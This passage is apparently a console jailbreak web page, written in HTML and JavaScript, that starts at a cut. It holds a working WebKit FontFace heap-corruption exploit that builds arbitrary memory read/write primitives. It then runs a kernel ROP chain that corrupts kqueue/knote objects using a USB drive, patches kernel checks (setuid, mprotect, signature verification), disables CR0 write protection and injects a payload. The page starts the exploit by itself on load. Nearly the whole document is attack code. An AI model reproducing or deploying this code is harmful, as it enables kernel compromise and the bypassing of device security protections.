    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);

    //Restore original UD

    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    

    kchain2.kwrite4(KERNEL_veriPatch, 0x83489090);

    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite4(KERNEL_enable_syscalls_4, 0x04EB69EB);
    kchain2.kwrite4(KERNEL_enable_syscalls_3, 0x3B489090);
    kchain2.kwrite4(KERNEL_enable_syscalls_2, 0xC9859090);

    kchain2.kwrite4(KERNEL_setuid, 0x8B482AEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite4(KERNEL_prx, 0x00C0E990);
    kchain2.kwrite4(KERNEL_dlsym_1, 0x8B484CEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite4(KERNEL_mmap, 0x37B24137);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);


    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1012, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
}



var trigger_spray = function () {
    //Make socket <= 0xFF | -> alloc 0x800


    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make Kqueues
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0); {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();

    //Fragment memory
    {
        for (var i = 20; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB
    alert("Insert USB Drive And Click OK When You See The Popup Notification");
	//alert("Remove The USB Drive And Click OK To Continue ...");
    //Trigger corrupt knote
    {
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();
if (chain.syscall(23, 0).low == 0) {
	//direct loading of GoldHEN - Leeful MOD(removed)
	//replaced with single inject for both conditions of exploit for ESP8266 boards and html payloads - stooged
	injectPayload();
	return;
}

else {alert("exploit failed (kernel heap might be fucked if you *did* insert the USB");
    p.write8(0, 0);
	return;
}
}
</script>

<script>
var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x1000;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

    function hex(n) {
        if ((typeof n) != "number")
            return "" + n;
        return "0x" + (new Number(n)).toString(16);
    }

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "evil";
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var ffs2 = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
    var badstr2 = mkString(HASHMAP_BUCKET, p_s);
    mkString(HASHMAP_BUCKET, p_s);

    bad_fonts[guessed_font].family = "evil2";
    bad_fonts[guessed_font + 1].family = "evil3";

    var leak = stringToPtr(badstr2.substr(badstr2.length - 8));

    var ffses = {};

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
    var sanity = stringToPtr(rd_leak, 32);

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    var ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    var ffs8 = new FontFaceSet(ffs8_args);
    mkString(HASHMAP_BUCKET, fake_s);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;


    window.addrof = function (obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return new int64(union_i[0], union_i[1]);
    }

    window.fakeobj = function (addr) {
        union_i[0] = addr.low;
        union_i[1] = addr.hi;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }
    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint32Array(2);

    var addrof_slave = addrof(arw_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    (function () {
        var magic = fakeobj(addrof(obj).add32(0x10));
        magic[4] = addrof_slave.low;
        magic[5] = addrof_slave.hi;
        magic = null;
    })();

    var prim = {
        write8: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            if(value instanceof int64) {
                arw_slave[0] = value.low;
                arw_slave[1] = value.hi;
            } else {
                arw_slave[0] = value;
                arw_slave[1] = 0;
            }
        },
        write4: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            if(value instanceof int64) {
                arw_slave[0] = value.low;
            } else {
                arw_slave[0] = value;
            }
        },
        write2: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            var tmp = arw_slave[0] & 0xFFFF0000;
            if(value instanceof int64) {
                arw_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                arw_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function(addr, value) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            var tmp = arw_slave[0] & 0xFFFFFF00;
            if(value instanceof int64) {
                arw_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                arw_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return new int64(arw_slave[0], arw_slave[1]);
        },
        read4: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0];
        },
        read2: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0] & 0xFFFF;
        },
        read1: function(addr) {
            arw_master[4] = addr.low;
            arw_master[5] = addr.hi;
            return arw_slave[0] & 0xFF;
        },
        leakval: function(obj) {
            arrays[257][32] = obj;
            union_f[0] = arrays[258][0];
            return new int64(union_i[0], union_i[1]);
        }
    };
    window.p = prim;
    run_hax();
}
</script>
</head>
<body onload="setTimeout(poc, 1500);">
<div id="loader" class="info">Loading Payload, Please Wait ...</div>
<div id="done" class="info" style="display:none;">Payload Loaded.</div>
</body>
</html>